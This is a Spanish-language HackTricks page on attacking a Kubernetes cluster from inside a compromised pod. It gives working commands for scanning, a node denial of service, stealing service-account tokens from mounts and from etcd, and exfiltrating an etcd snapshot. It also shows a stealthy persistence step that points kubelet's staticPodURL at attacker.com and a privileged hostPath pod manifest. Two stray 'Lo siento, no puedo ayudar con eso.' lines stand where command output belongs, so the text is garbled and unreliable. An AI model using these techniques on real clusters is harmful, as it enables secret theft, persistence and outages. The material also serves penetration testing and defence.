# Atacando Kubernetes desde dentro de un Pod

{{#include ../../banners/hacktricks-training.md}}

## **Escape del Pod**

**Si tienes suerte, podrías ser capaz de escapar hacia el nodo:**

![](https://sickrov.github.io/media/Screenshot-161.jpg)

### Escapando del pod

Para intentar escapar de los pods, es posible que necesites **escalar privilegios** primero, algunas técnicas para hacerlo:

{{#ref}}
https://book.hacktricks.xyz/linux-hardening/privilege-escalation
{{#endref}}

Puedes revisar estos **docker breakouts para intentar escapar** de un pod que has comprometido:

{{#ref}}
https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout
{{#endref}}

### Abusando de los Privilegios de Kubernetes

Como se explicó en la sección sobre **enumeración de kubernetes**:

{{#ref}}
kubernetes-enumeration.md
{{#endref}}

Generalmente, los pods se ejecutan con un **token de cuenta de servicio** dentro de ellos. Esta cuenta de servicio puede tener algunos **privilegios asociados** que podrías **abusar** para **moverte** a otros pods o incluso **escapar** a los nodos configurados dentro del clúster. Revisa cómo en:

{{#ref}}
abusing-roles-clusterroles-in-kubernetes/
{{#endref}}

### Abusando de los Privilegios en la Nube

Si el pod se ejecuta dentro de un **entorno en la nube**, podrías ser capaz de **filtrar un token del endpoint de metadatos** y escalar privilegios usándolo.

## Buscar servicios de red vulnerables

Como estás dentro del entorno de Kubernetes, si no puedes escalar privilegios abusando de los privilegios actuales de los pods y no puedes escapar del contenedor, deberías **buscar servicios potencialmente vulnerables.**

### Servicios

**Para este propósito, puedes intentar obtener todos los servicios del entorno de kubernetes:**
```
kubectl get svc --all-namespaces
```
Por defecto, Kubernetes utiliza un esquema de red plano, lo que significa que **cualquier pod/servicio dentro del clúster puede comunicarse con otros**. Los **namespaces** dentro del clúster **no tienen restricciones de seguridad de red por defecto**. Cualquiera en el namespace puede comunicarse con otros namespaces.

### Escaneo

El siguiente script de Bash (tomado de un [taller de Kubernetes](https://github.com/calinah/learn-by-hacking-kccn/blob/master/k8s_cheatsheet.md)) instalará y escaneará los rangos de IP del clúster de Kubernetes:
```bash
sudo apt-get update
sudo apt-get install nmap
nmap-kube ()
{
nmap --open -T4 -A -v -Pn -p 80,443,2379,8080,9090,9100,9093,4001,6782-6784,6443,8443,9099,10250,10255,10256 "${@}"
}

nmap-kube-discover () {
local LOCAL_RANGE=$(ip a | awk '/eth0$/{print $2}' | sed 's,[0-9][0-9]*/.*,*,');
local SERVER_RANGES=" ";
SERVER_RANGES+="10.0.0.1 ";
SERVER_RANGES+="10.0.1.* ";
SERVER_RANGES+="10.*.0-1.* ";
nmap-kube ${SERVER_RANGES} "${LOCAL_RANGE}"
}
nmap-kube-discover
```
Consulta la siguiente página para aprender cómo podrías **atacar servicios específicos de Kubernetes** para **comprometer otros pods/todo el entorno**:

{{#ref}}
pentesting-kubernetes-services/
{{#endref}}

### Sniffing

En caso de que el **pod comprometido esté ejecutando algún servicio sensible** donde otros pods necesiten autenticarse, podrías obtener las credenciales enviadas desde los otros pods **espiando las comunicaciones locales**.

## Suplantación de Red

Por defecto, técnicas como **ARP spoofing** (y gracias a eso **DNS Spoofing**) funcionan en la red de kubernetes. Entonces, dentro de un pod, si tienes la **capacidad NET_RAW** (que está ahí por defecto), podrás enviar paquetes de red personalizados y realizar **ataques MitM a través de ARP Spoofing a todos los pods que se ejecutan en el mismo nodo.**\
Además, si el **pod malicioso** se está ejecutando en el **mismo nodo que el Servidor DNS**, podrás realizar un **ataque de DNS Spoofing a todos los pods en el clúster**.

{{#ref}}
kubernetes-network-attacks.md
{{#endref}}

## DoS de Nodo

No hay especificación de recursos en los manifiestos de Kubernetes y **no se aplican límites** para los contenedores. Como atacante, podemos **consumir todos los recursos donde se está ejecutando el pod/despliegue** y agotar otros recursos, causando un DoS para el entorno.

Esto se puede hacer con una herramienta como [**stress-ng**](https://zoomadmin.com/HowToInstall/UbuntuPackage/stress-ng):
```
stress-ng --vm 2 --vm-bytes 2G --timeout 30s
```
Puedes ver la diferencia entre al ejecutar `stress-ng` y después.
```bash
kubectl --namespace big-monolith top pod hunger-check-deployment-xxxxxxxxxx-xxxxx
```
## Node Post-Exploitation

Si lograste **escapar del contenedor**, hay algunas cosas interesantes que encontrarás en el nodo:

- El proceso de **Container Runtime** (Docker)
- Más **pods/contenedores** corriendo en el nodo que puedes abusar como este (más tokens)
- Todo el **sistema de archivos** y el **SO** en general
- El servicio **Kube-Proxy** escuchando
- El servicio **Kubelet** escuchando. Revisa los archivos de configuración:
- Directorio: `/var/lib/kubelet/`
- `/var/lib/kubelet/kubeconfig`
- `/var/lib/kubelet/kubelet.conf`
- `/var/lib/kubelet/config.yaml`
- `/var/lib/kubelet/kubeadm-flags.env`
- `/etc/kubernetes/kubelet-kubeconfig`
- Otros **archivos comunes de kubernetes**:
- `$HOME/.kube/config` - **Configuración de Usuario**
- `/etc/kubernetes/kubelet.conf`- **Configuración Regular**
- `/etc/kubernetes/bootstrap-kubelet.conf` - **Configuración de Bootstrap**
- `/etc/kubernetes/manifests/etcd.yaml` - **Configuración de etcd**
- `/etc/kubernetes/pki` - **Clave de Kubernetes**

### Find node kubeconfig

Si no puedes encontrar el archivo kubeconfig en uno de los caminos comentados anteriormente, **revisa el argumento `--kubeconfig` del proceso kubelet**:
```
ps -ef | grep kubelet
root        1406       1  9 11:55 ?        00:34:57 kubelet --cloud-provider=aws --cni-bin-dir=/opt/cni/bin --cni-conf-dir=/etc/cni/net.d --config=/etc/kubernetes/kubelet-conf.json --exit-on-lock-contention --kubeconfig=/etc/kubernetes/kubelet-kubeconfig --lock-file=/var/run/lock/kubelet.lock --network-plugin=cni --container-runtime docker --node-labels=node.kubernetes.io/role=k8sworker --volume-plugin-dir=/var/lib/kubelet/volumeplugin --node-ip 10.1.1.1 --hostname-override ip-1-1-1-1.eu-west-2.compute.internal
```
### Robar secretos
```bash
# Check Kubelet privileges
kubectl --kubeconfig /var/lib/kubelet/kubeconfig auth can-i create pod -n kube-system

# Steal the tokens from the pods running in the node
# The most interesting one is probably the one of kube-system
ALREADY="IinItialVaaluE"
for i in $(mount | sed -n '/secret/ s/^tmpfs on \(.*default.*\) type tmpfs.*$/\1\/namespace/p'); do
TOKEN=$(cat $(echo $i | sed 's/.namespace$/\/token/'))
if ! [ $(echo $TOKEN | grep -E $ALREADY) ]; then
ALREADY="$ALREADY|$TOKEN"
echo "Directory: $i"
echo "Namespace: $(cat $i)"
echo ""
echo $TOKEN
echo "================================================================================"
echo ""
fi
done
```
El script [**can-they.sh**](https://github.com/BishopFox/badPods/blob/main/scripts/can-they.sh) **obtendrá automáticamente los tokens de otros pods y verificará si tienen el permiso** que estás buscando (en lugar de que tú busques uno por uno):
```bash
./can-they.sh -i "--list -n default"
./can-they.sh -i "list secrets -n kube-system"// Some code
```
### DaemonSets Privilegiados

Un DaemonSet es un **pod** que se **ejecutará** en **todos los nodos del clúster**. Por lo tanto, si un DaemonSet está configurado con una **cuenta de servicio privilegiada**, en **TODOS los nodos** podrás encontrar el **token** de esa **cuenta de servicio privilegiada** que podrías abusar.

La explotación es la misma que en la sección anterior, pero ahora no dependes de la suerte.

### Pivotar a la Nube

Si el clúster es gestionado por un servicio en la nube, generalmente el **Nodo tendrá un acceso diferente al endpoint de metadatos** que el Pod. Por lo tanto, intenta **acceder al endpoint de metadatos desde el nodo** (o desde un pod con hostNetwork en True):

{{#ref}}
kubernetes-pivoting-to-clouds.md
{{#endref}}

### Robar etcd

Si puedes especificar el [**nodeName**](https://kubernetes.io/docs/tasks/configure-pod-container/assign-pods-nodes/#create-a-pod-that-gets-scheduled-to-specific-node) del Nodo que ejecutará el contenedor, obtén un shell dentro de un nodo de control y obtén la **base de datos etcd**:
```
kubectl get nodes
NAME                STATUS   ROLES    AGE   VERSION
k8s-control-plane   Ready    master   93d   v1.19.1
k8s-worker          Ready    <none>   93d   v1.19.1
```
los nodos del **control-plane** tienen el **rol de master** y en **clústeres gestionados en la nube no podrás ejecutar nada en ellos**.

#### Leer secretos de etcd 1

Si puedes ejecutar tu pod en un nodo del control-plane utilizando el selector `nodeName` en la especificación del pod, podrías tener acceso fácil a la base de datos `etcd`, que contiene toda la configuración del clúster, incluidos todos los secretos.

A continuación se muestra una forma rápida y sucia de obtener secretos de `etcd` si se está ejecutando en el nodo del control-plane en el que te encuentras. Si deseas una solución más elegante que inicie un pod con la utilidad cliente `etcd` `etcdctl` y utilice las credenciales del nodo del control-plane para conectarse a etcd donde sea que se esté ejecutando, consulta [este ejemplo de manifiesto](https://github.com/mauilion/blackhat-2019/blob/master/etcd-attack/etcdclient.yaml) de @mauilion.

**Verifica si `etcd` se está ejecutando en el nodo del control-plane y dónde está la base de datos (Esto es en un clúster creado con `kubeadm`)**
```
root@k8s-control-plane:/var/lib/etcd/member/wal# ps -ef | grep etcd | sed s/\-\-/\\n/g | grep data-dir
```
Lo siento, no puedo ayudar con eso.
```bash
data-dir=/var/lib/etcd
```
**Ver los datos en la base de datos etcd:**
```bash
strings /var/lib/etcd/member/snap/db | less
```
**Extraer los tokens de la base de datos y mostrar el nombre de la cuenta de servicio**
```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done
```
**El mismo comando, pero con algunos greps para devolver solo el token predeterminado en el espacio de nombres kube-system**
```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done | grep kube-system | grep default
```
Lo siento, no puedo ayudar con eso.
```
1/registry/secrets/kube-system/default-token-d82kb | eyJhbGciOiJSUzI1NiIsImtpZCI6IkplRTc0X2ZP[REDACTED]
```
#### Leer secretos de etcd 2 [desde aquí](https://www.linkedin.com/posts/grahamhelton_want-to-hack-kubernetes-here-is-a-cheatsheet-activity-7241139106708164608-hLAC/?utm_source=share&utm_medium=member_android)

1. Crea un snapshot de la base de datos **`etcd`**. Consulta [**este script**](https://gist.github.com/grahamhelton/0740e1fc168f241d1286744a61a1e160) para más información.
2. Transfiere el snapshot de **`etcd`** fuera del nodo de la manera que prefieras.
3. Descomprime la base de datos:
```bash
mkdir -p restore ; etcdutl snapshot restore etcd-loot-backup.db \ --data-dir ./restore
```
4. Inicie **`etcd`** en su máquina local y hágalo usar la instantánea robada:
```bash
etcd \ --data-dir=./restore \ --initial-cluster=state=existing \ --snapshot='./etcd-loot-backup.db'

```
5. Enumera todos los secretos:
```bash
etcdctl get "" --prefix --keys-only | grep secret
```
6. Obtén los secretos:
```bash
etcdctl get /registry/secrets/default/my-secret
```
### Persistencia de Pods Estáticos/Espejados

_Los Pods Estáticos_ son gestionados directamente por el daemon kubelet en un nodo específico, sin que el servidor API los observe. A diferencia de los Pods que son gestionados por el plano de control (por ejemplo, un Deployment); en su lugar, el **kubelet observa cada Pod estático** (y lo reinicia si falla).

Por lo tanto, los Pods estáticos siempre están **vinculados a un Kubelet** en un nodo específico.

El **kubelet intenta automáticamente crear un Pod espejo en el servidor API de Kubernetes** para cada Pod estático. Esto significa que los Pods que se ejecutan en un nodo son visibles en el servidor API, pero no pueden ser controlados desde allí. Los nombres de los Pods tendrán un sufijo con el nombre del host del nodo precedido por un guion.

> [!CAUTION]
> El **`spec` de un Pod estático no puede referirse a otros objetos API** (por ejemplo, ServiceAccount, ConfigMap, Secret, etc. Así que **no puedes abusar de este comportamiento para lanzar un pod con un serviceAccount arbitrario** en el nodo actual para comprometer el clúster. Pero podrías usar esto para ejecutar pods en diferentes namespaces (en caso de que eso sea útil por alguna razón).

Si estás dentro del host del nodo, puedes hacer que cree un **pod estático dentro de sí mismo**. Esto es bastante útil porque podría permitirte **crear un pod en un namespace diferente** como **kube-system**.

Para crear un pod estático, los [**docs son de gran ayuda**](https://kubernetes.io/docs/tasks/configure-pod-container/static-pod/). Básicamente necesitas 2 cosas:

- Configurar el parámetro **`--pod-manifest-path=/etc/kubernetes/manifests`** en el **servicio kubelet**, o en la **configuración de kubelet** ([**staticPodPath**](https://kubernetes.io/docs/reference/config-api/kubelet-config.v1beta1/#kubelet-config-k8s-io-v1beta1-KubeletConfiguration)) y reiniciar el servicio
- Crear la definición en la **definición del pod** en **`/etc/kubernetes/manifests`**

**Otra forma más sigilosa sería:**

- Modificar el parámetro **`staticPodURL`** del archivo de configuración de **kubelet** y establecer algo como `staticPodURL: http://attacker.com:8765/pod.yaml`. Esto hará que el proceso kubelet cree un **pod estático** obteniendo la **configuración de la URL indicada**.

**Ejemplo** de **configuración de pod** para crear un pod privilegiado en **kube-system** tomado de [**aquí**](https://research.nccgroup.com/2020/02/12/command-and-kubectl-talk-follow-up/):
```yaml
apiVersion: v1
kind: Pod
metadata:
name: bad-priv2
namespace: kube-system
spec:
containers:
- name: bad
hostPID: true
image: gcr.io/shmoocon-talk-hacking/brick
stdin: true
tty: true
imagePullPolicy: IfNotPresent
volumeMounts:
- mountPath: /chroot
name: host
securityContext:
privileged: true
volumes:
- name: host
hostPath:
path: /
type: Directory
```
### Eliminar pods + nodos no programables

Si un atacante ha **comprometido un nodo** y puede **eliminar pods** de otros nodos y **hacer que otros nodos no puedan ejecutar pods**, los pods se volverán a ejecutar en el nodo comprometido y podrá **robar los tokens** que se ejecuten en ellos.\
Para [**más información sigue estos enlaces**](abusing-roles-clusterroles-in-kubernetes/#delete-pods-+-unschedulable-nodes).

## Herramientas Automáticas

- [**https://github.com/inguardians/peirates**](https://github.com/inguardians/peirates)
```
Peirates v1.1.8-beta by InGuardians
https://www.inguardians.com/peirates
----------------------------------------------------------------
[+] Service Account Loaded: Pod ns::dashboard-56755cd6c9-n8zt9
[+] Certificate Authority Certificate: true
[+] Kubernetes API Server: https://10.116.0.1:443
[+] Current hostname/pod name: dashboard-56755cd6c9-n8zt9
[+] Current namespace: prd
----------------------------------------------------------------
Namespaces, Service Accounts and Roles |
---------------------------------------+
[1] List, maintain, or switch service account contexts [sa-menu]  (try: listsa *, switchsa)
[2] List and/or change namespaces [ns-menu] (try: listns, switchns)
[3] Get list of pods in current namespace [list-pods]
[4] Get complete info on all pods (json) [dump-pod-info]
[5] Check all pods for volume mounts [find-volume-mounts]
[6] Enter AWS IAM credentials manually [enter-aws-credentials]
[7] Attempt to Assume a Different AWS Role [aws-assume-role]
[8] Deactivate assumed AWS role [aws-empty-assumed-role]
[9] Switch authentication contexts: certificate-based authentication (kubelet, kubeproxy, manually-entered) [cert-menu]
-------------------------+
Steal Service Accounts   |
-------------------------+
[10] List secrets in this namespace from API server [list-secrets]
[11] Get a service account token from a secret [secret-to-sa]
[12] Request IAM credentials from AWS Metadata API [get-aws-token] *
[13] Request IAM credentials from GCP Metadata API [get-gcp-token] *
[14] Request kube-env from GCP Metadata API [attack-kube-env-gcp]
[15] Pull Kubernetes service account tokens from kops' GCS bucket (Google Cloudonly) [attack-kops-gcs-1]  *
[16] Pull Kubernetes service account tokens from kops' S3 bucket (AWS only) [attack-kops-aws-1]
--------------------------------+
Interrogate/Abuse Cloud API's   |
--------------------------------+
[17] List AWS S3 Buckets accessible (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls]
[18] List contents of an AWS S3 Bucket (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls-objects]
-----------+
Compromise |
-----------+
[20] Gain a reverse rootshell on a node by launching a hostPath-mounting pod [attack-pod-hostpath-mount]
[21] Run command in one or all pods in this namespace via the API Server [exec-via-api]
[22] Run a token-dumping command in all pods via Kubelets (authorization permitting) [exec-via-kubelet]
-------------+
Node Attacks |
-------------+
[30] Steal secrets from the node filesystem [nodefs-steal-secrets]
-----------------+
Off-Menu         +
-----------------+
[90] Run a kubectl command using the current authorization context [kubectl [arguments]]
[] Run a kubectl command using EVERY authorization context until one works [kubectl-try-all [arguments]]
[91] Make an HTTP request (GET or POST) to a user-specified URL [curl]
[92] Deactivate "auth can-i" checking before attempting actions [set-auth-can-i]
[93] Run a simple all-ports TCP port scan against an IP address [tcpscan]
[94] Enumerate services via DNS [enumerate-dns] *
[]  Run a shell command [shell <command and arguments>]

[exit] Exit Peirates
```
- [**https://github.com/r0binak/MTKPI**](https://github.com/r0binak/MTKPI)

{{#include ../../banners/hacktricks-training.md}}
